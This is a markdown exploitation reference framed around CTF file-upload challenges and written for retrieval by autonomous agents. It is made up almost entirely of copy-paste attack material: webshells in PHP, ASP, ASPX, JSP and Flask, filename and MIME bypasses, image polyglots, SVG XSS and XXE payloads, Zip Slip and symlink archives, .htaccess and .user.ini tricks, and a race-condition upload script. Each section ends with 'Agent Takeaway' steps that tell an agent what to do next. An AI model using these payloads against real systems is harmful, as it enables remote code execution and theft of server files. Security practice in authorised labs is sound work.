# File Upload Vulnerabilities - CTF Exploitation Reference

> **Document Purpose:** Actionable file upload attack techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, bypass methods, and webshell deployment.

---

## 1. QUICK REFERENCE: File Upload Attacks

> **When to use this section:** Application allows file uploads.

### 1.1 Basic Webshell Upload

**Tags:** `file-upload, webshell, rce, basic`

**Simple PHP Webshell:**
```php
<?php system($_GET['cmd']); ?>
```

**Save as:** `shell.php`

**After upload, access:**
```
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat /flag.txt
```

**One-liner Shells:**
```php
<?php passthru($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php eval($_GET['c']); ?>
<?=`$_GET[c]`?>
```

**Agent Takeaway:**
- Upload PHP shell
- Access via URL with command parameter
- Try multiple shell variants

---

### 1.2 Common Upload Locations

**Tags:** `file-upload, locations, paths, access`

**Common Upload Directories:**
```
/uploads/
/upload/
/files/
/images/
/img/
/media/
/attachments/
/documents/
/static/uploads/
/content/uploads/
/wp-content/uploads/  (WordPress)
```

**Finding Your Upload:**
- Check response for file path
- Look at image src in HTML
- Try common directories
- Check robots.txt for hints

**Agent Takeaway:**
- Note the path returned after upload
- Try common upload directories if not shown
- Uploaded file may be renamed

---

## 2. BYPASSING FILE TYPE RESTRICTIONS

> **When to use this section:** Application blocks certain file types.

### 2.1 Extension Bypass

**Tags:** `file-upload, bypass, extension, filter`

**Alternative PHP Extensions:**
```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
.pht
.pgif
.shtml
.htaccess
.inc
```

**Case Variations:**
```
.pHp
.PHP
.PhP
.Php
.pHP
```

**Double Extensions:**
```
shell.php.jpg
shell.php.png
shell.jpg.php
shell.png.php
shell.php.txt
shell.txt.php
```

**Null Byte (Old PHP):**
```
shell.php%00.jpg
shell.php\x00.jpg
```

**Special Characters:**
```
shell.php%20
shell.php.
shell.php....
shell.php::$DATA (Windows)
shell.php;.jpg
```

**Agent Takeaway:**
- Try alternative extensions: `.phtml`, `.php5`
- Double extensions may bypass: `shell.php.jpg`
- Null byte truncates in old systems

---

### 2.2 Content-Type Bypass

**Tags:** `file-upload, bypass, content-type, mime`

**Change Content-Type Header:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

**Even with PHP file, set:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

**Agent Takeaway:**
- Server may only check Content-Type header
- Set to `image/jpeg` or `image/png`
- Keep malicious content/extension

---

### 2.3 Magic Bytes Bypass

**Tags:** `file-upload, bypass, magic-bytes, header, signature`

**Add Image Magic Bytes Before PHP:**

**GIF Header:**
```
GIF89a
<?php system($_GET['cmd']); ?>
```

**PNG Header (Hex):**
```
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>
```

**JPEG Header (Hex):**
```
\xFF\xD8\xFF\xE0
<?php system($_GET['cmd']); ?>
```

**Creating Polyglot Files:**
```bash
# GIF + PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# PNG + PHP (using real PNG header)
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
```

**Agent Takeaway:**
- Add valid image header before PHP code
- `GIF89a` is easiest to type
- File is valid image AND valid PHP

---

### 2.4 Filename Manipulation

**Tags:** `file-upload, bypass, filename, manipulation`

**Whitespace Tricks:**
```
shell.php (trailing space)
shell.php%20
shell.php%09 (tab)
shell%20.php
```

**Dot Tricks:**
```
shell.php.
shell.php..
shell.php...
..shell.php
```

**URL Encoding:**
```
shell%2ephp
shell.p%68p
%73%68%65%6c%6c%2e%70%68%70
```

**Unicode/UTF-8:**
```
shell.ⓟⓗⓟ
shell.php (using full-width characters)
```

**Agent Takeaway:**
- Trailing dots/spaces may be stripped by server
- Try URL encoding extension
- Some filters check start, not full string

---

## 3. BYPASSING CONTENT VALIDATION

> **When to use this section:** Server validates actual file content.

### 3.1 Image File Exploits

**Tags:** `file-upload, image, exif, polyglot`

**PHP in EXIF (Requires exiftool):**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```
Then upload and access as PHP (if server executes .jpg as PHP).

**PHP in Image Metadata:**
```php
<?php
$image = imagecreatetruecolor(100, 100);
imagestring($image, 1, 0, 0, '<?php system($_GET["cmd"]); ?>', 0);
imagepng($image, 'shell.png');
```

**GIF Polyglot:**
```
GIF89a=0;
<?php system($_GET['cmd']); ?>
```

**Agent Takeaway:**
- Embed PHP in image metadata
- Polyglot files pass image validation
- May need LFI to execute as PHP

---

### 3.2 SVG XSS and XXE

**Tags:** `file-upload, svg, xss, xxe`

**SVG with XSS:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert('XSS')</script>
</svg>
```

**SVG with XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Agent Takeaway:**
- SVG is XML-based, supports scripts
- SVG upload → XSS or XXE
- Often overlooked in upload filters

---

### 3.3 ZIP/Archive Attacks

**Tags:** `file-upload, zip, archive, symlink, path-traversal`

**Zip Slip (Path Traversal):**
```bash
# Create file with traversal path
echo '<?php system($_GET["cmd"]); ?>' > '../../../var/www/html/shell.php'
zip shell.zip '../../../var/www/html/shell.php'
```

**Symlink Attack:**
```bash
ln -s /etc/passwd link
zip --symlinks shell.zip link
```
Upload ZIP → server extracts → symlink points to sensitive file.

**Agent Takeaway:**
- ZIP extraction may not sanitize paths
- Symlinks can read arbitrary files
- Zip Slip writes outside intended directory

---

## 4. ADVANCED TECHNIQUES

> **When to use this section:** Basic bypasses don't work.

### 4.1 .htaccess Upload

**Tags:** `file-upload, htaccess, apache, configuration`

**Create .htaccess to Execute PHP:**
```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

**Attack Steps:**
1. Upload `.htaccess` with above content
2. Upload `shell.jpg` with PHP code
3. Access `shell.jpg` → executed as PHP

**Alternative .htaccess:**
```apache
# Make .txt files execute as PHP
AddType application/x-httpd-php .txt
```

**Agent Takeaway:**
- .htaccess can change how files are processed
- Upload .htaccess THEN your shell
- Works on Apache servers

---

### 4.2 .user.ini Upload (PHP-FPM)

**Tags:** `file-upload, user-ini, php-fpm, auto-prepend`

**Create .user.ini:**
```ini
auto_prepend_file=shell.jpg
```

**Attack Steps:**
1. Upload `.user.ini` with auto_prepend
2. Upload `shell.jpg` with PHP code
3. Access ANY PHP file in that directory
4. Shell is automatically prepended/executed

**Agent Takeaway:**
- Works with PHP-FPM, not Apache mod_php
- Prepends shell to every PHP request
- Alternative to .htaccess

---

### 4.3 Race Condition Upload

**Tags:** `file-upload, race-condition, timing`

**The Vulnerability:**
Server uploads file, then checks/deletes it.

**Attack:**
```python
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    r = requests.get('http://target.com/uploads/shell.php?cmd=id')
    if 'uid=' in r.text:
        print("SUCCESS:", r.text)

while True:
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=access)
    t1.start()
    t2.start()
```

**Agent Takeaway:**
- Upload and access simultaneously
- Beat the deletion check
- May take many attempts

---

## 5. WEBSHELLS AND PAYLOADS

> **When to use this section:** You've bypassed upload and need effective shells.

### 5.1 PHP Webshells

**Tags:** `file-upload, webshell, php, payloads`

**Simple Command Execution:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php echo `$_GET[c]`; ?>
<?=`$_GET[c]`?>
```

**POST-Based (Harder to Detect):**
```php
<?php system($_POST['cmd']); ?>
```

**Eval-Based:**
```php
<?php eval($_GET['c']); ?>
<?php eval(base64_decode($_GET['c'])); ?>
```

**Minimal Shells:**
```php
<?=`$_GET[0]`?>
<?=$_GET[0]($_GET[1])?>
```

**Agent Takeaway:**
- Simpler is often better
- Use POST for stealth
- Minimal shells bypass keyword filters

---

### 5.2 Other Language Shells

**Tags:** `file-upload, webshell, asp, jsp, python`

**ASP Classic:**
```asp
<%eval request("cmd")%>
<%response.write CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()%>
```

**ASPX (C#):**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
  var cmd = Request["cmd"];
  var proc = new Process();
  proc.StartInfo.FileName = "cmd.exe";
  proc.StartInfo.Arguments = "/c " + cmd;
  proc.StartInfo.UseShellExecute = false;
  proc.StartInfo.RedirectStandardOutput = true;
  proc.Start();
  Response.Write(proc.StandardOutput.ReadToEnd());
%>
```

**JSP (Java):**
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while((line = br.readLine()) != null) {
    out.println(line);
  }
%>
```

**Python (Flask/WSGI):**
```python
import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/shell')
def shell():
    return os.popen(request.args.get('cmd')).read()
```

**Agent Takeaway:**
- Match shell language to target stack
- ASP for Windows/IIS
- JSP for Java/Tomcat

---

## 6. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving file upload challenges in CTF.

### 6.1 File Upload CTF Playbook

**Tags:** `file-upload, ctf, playbook, workflow`

**Step 1: Upload Normal File**
```
Upload legitimate image to understand process
Note: upload path, renaming, accessible URL
```

**Step 2: Try Direct PHP Upload**
```php
<?php system($_GET['cmd']); ?>
```
Save as `shell.php`

**Step 3: If Blocked, Bypass Extension**
```
shell.php5
shell.phtml
shell.php.jpg
shell.jpg.php
```

**Step 4: If Content-Type Checked**
```
Set Content-Type: image/jpeg
Keep PHP content
```

**Step 5: If Content Validated**
```
GIF89a<?php system($_GET['cmd']); ?>
```

**Step 6: Access Shell**
```
http://target.com/uploads/shell.php?cmd=cat /flag.txt
```

**Agent Takeaway:**
- Test what's allowed first
- Try bypasses systematically
- Find flag with shell access

---

### 6.2 Upload Attack Decision Tree

**Tags:** `file-upload, decision-tree, workflow`

```
START: File upload identified

STEP 1: Test normal upload
├── Note upload path
├── Check if file accessible
└── Try to access uploaded file

STEP 2: Upload PHP shell
├── If allowed → Access and execute
└── If blocked → Identify what's checked

STEP 3: Bypass file extension
├── Try .php5, .phtml, .phar
├── Try double extension .php.jpg
├── Try case variation .pHp
└── Try null byte (old systems)

STEP 4: Bypass Content-Type
├── Set Content-Type: image/jpeg
└── Keep PHP extension

STEP 5: Bypass content validation
├── Add magic bytes: GIF89a
├── Use polyglot file
└── Try EXIF injection

STEP 6: Alternative attacks
├── Upload .htaccess
├── Upload .user.ini
├── SVG for XSS/XXE
└── ZIP for path traversal

STEP 7: Execute and get flag
├── Access shell with cmd parameter
└── cat /flag.txt
```

---

## 7. SUMMARY: File Upload Quick Reference

**Basic PHP Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Extension Bypasses:**
```
.php5, .phtml, .phar
.php.jpg, .jpg.php
.pHp, .PHP
```

**Content-Type Bypass:**
```
Content-Type: image/jpeg
```

**Magic Bytes Bypass:**
```
GIF89a<?php system($_GET['cmd']); ?>
```

**.htaccess Bypass:**
```apache
AddType application/x-httpd-php .jpg
```

**Access Shell:**
```
http://target.com/uploads/shell.php?cmd=cat /flag.txt
```

**Common Directories:**
```
/uploads/, /files/, /images/, /media/
```
